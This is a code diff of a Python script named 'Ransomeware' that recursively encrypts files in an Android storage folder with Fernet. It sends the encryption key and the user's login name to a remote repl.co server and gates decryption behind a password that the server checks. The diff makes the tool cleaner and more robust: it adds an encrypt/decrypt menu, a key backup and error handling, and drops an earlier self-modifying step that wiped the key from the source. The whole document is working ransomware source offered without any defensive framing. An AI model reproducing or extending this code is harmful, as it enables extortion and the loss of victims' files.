@@ -1,84 +1,117 @@
 import os
+import sys
+import json
+import subprocess
+
 try:
     from cryptography.fernet import Fernet
 except:
-    os.system("pip install Rust cryptography")
-import sys
+    subprocess.run("pip install cryptography", shell=True)
 try:
     import requests
 except:
-    os.system('pip install requests')
+    subprocess.run("pip install requests", shell=True)
 
 dirr = "/storage/emulated/0/ransomeware"
 files = []
 key = Fernet.generate_key()
 
 def scanRecurse(base_dir):
-	for entry in os.scandir(base_dir):
-		if entry.is_file():
-			yield entry
-		else:
-			yield from scanRecurse(entry.path)
+    for entry in os.scandir(base_dir):
+        if entry.is_file():
+            yield entry
+        else:
+            yield from scanRecurse(entry.path)
 
 for i in scanRecurse(dirr):
-			if sys.argv[0] in i.path:
-				continue
-			files.append(i.path)
+            if __file__ in i.path or 'key.key' in i.path:
+                continue
+            files.append(i.path)
 
 class Ransomeware:
-	def init(self):
-		pass
+    def __init__(self):
+        self.password_verification_url = "https://u0a270.repl.co/r"
+        self.key_upload_url = "https://u0a270.repl.co/upload_key"
 
-	def destroy_code(self, file_name, line_num, text):
- 	   lines = open(file_name, 'r').readlines()
- 	   lines[line_num] = text
- 	   out = open(file_name, 'w')
- 	   out.writelines(lines)
- 	   out.close()
-		
-	def _generate_key(self):
-		json = {}
-		json['key'] = key.decode('UTF-8')
-		json['whoami'] = os.getlogin()
-		res = requests.post("https://u0a270.repl.co/r", json=json)
-		try:
-			res.json()
-		except:
-			res.text
-		self.destroy_code(sys.argv[0], 7, "key = None\n")
+    def check_password(self):
+        password = input("Enter the password: ")
+        device_id = os.getlogin()
+        json = {'password': password, 'user_id': device_id}
+        try:
+            res = requests.post(self.password_verification_url, json=json)
+            res.raise_for_status()
+            global key
+            key = res.json()['key']
+            return key
+        except requests.exceptions.RequestException as e:
+            print("Error verifying password: ", e)
+            return False
 
-	def decrypt(self):
-		
-		
-		key1 = input("Enter your decryption key: \n")
-		for file in files:
-			with open(file, 'rb') as file_data:
-				data = file_data.read()
-				decrypted_data = Fernet(key1.encode('UTF-8')).decrypt(data)
-				with open(file,'wb') as file_data:
-					file_data.write(decrypted_data)
-
-	def encrypt(self):
-		
-		self._generate_key()
-		for file in files:
-			with open(file, 'rb') as file_data:
-				data = file_data.read()
-			encrypted_data = Fernet(key).encrypt(data)
-			with open(file,'wb') as file_data:
-				file_data.write(encrypted_data)
-	
-	
+    def backup_key(self):
+        try:
+            with open('key.key', 'wb') as key_file:
+                key_file.write(key)
+            print("Encryption key backed up to 'key.key'.")
+        except Exception as e:
+            print("Error backing up key: ", e)
+                                    
+        
+    def send_key(self):
+         json_data = {'user_id': os.getlogin(), 'key': key.decode('UTF-8')}
+         try:
+         	   res = requests.post(self.key_upload_url, json=json_data)
+         	   res.raise_for_status()
+         	   print("Encryption key sent to server.")
+         except requests.exceptions.					RequestException as e:
+          	  print("Error sending key to server: ", e)
+                                        
+    def encrypt(self):
+        if not key:
+            if not self.check_password():
+                return
+        self.backup_key()
+        self.send_key()
+        for file in files:
+            if not os.path.isfile(file):
+                print(f"{file} not found or is not a file, skipping.")
+                continue
+            try:
+                with open(file, 'rb') as file_data:
+                    data = file_data.read()
+                encrypted_data = Fernet(key).encrypt(data)
+                print(f'Encrypted: {file}')
+                with open(file,'wb') as file_data:
+                    file_data.write(encrypted_data)
+            except Exception as e:
+                print(f"Error encrypting {file}: {e}")
+    
+    def decrypt(self):
+        key = self.check_password()
+        if not key:
+            key = input("Enter the decryption key: ")
+        for file in files:
+            if not os.path.isfile(file):
+                print(f"{file} not found or is not a file, skipping.")
+                continue
+            try:
+                with open(file, 'rb') as file_data:
+                    data = file_data.read()
+                decrypted_data = Fernet(key).decrypt(data)
+                print(f'Decrypted: {file}')
+                with open(file,'wb') as file_data:
+                    file_data.write(decrypted_data)
+            except Exception as e:
+                print(f"Error decrypting {file}: {e}")
 
 if __name__ == "__main__":
-		ransomware = Ransomeware()
-		try:
-			ransomware.encrypt()
-			ransomware.destroy_code(sys.argv[0], 61, '\t\t"""\n')
-			ransomware.destroy_code(sys.argv[0], 70, '\t"""\n')
-			ransomware.destroy_code(sys.argv[0], 71, '\tpass\n')
-			ransomware.decrypt()
-		except:
-			print("Sorry, an exception occurred!")
-#			ransomeware.encrypt(path_to_folder=dirr)
-#			ransomeware.decrypt()
+    ransomeware = Ransomeware()
+    if not files:
+        print("No files found to encrypt/decrypt")
+    else:
+        choice = input("Do you want to (E)ncrypt or (D)ecrypt files? ")
+        if choice.upper() == "E":
+            ransomeware.encrypt()
+        elif choice.upper() == "D":
+            ransomeware.decrypt()
+        else:
+            print("Invalid choice. Exiting.")
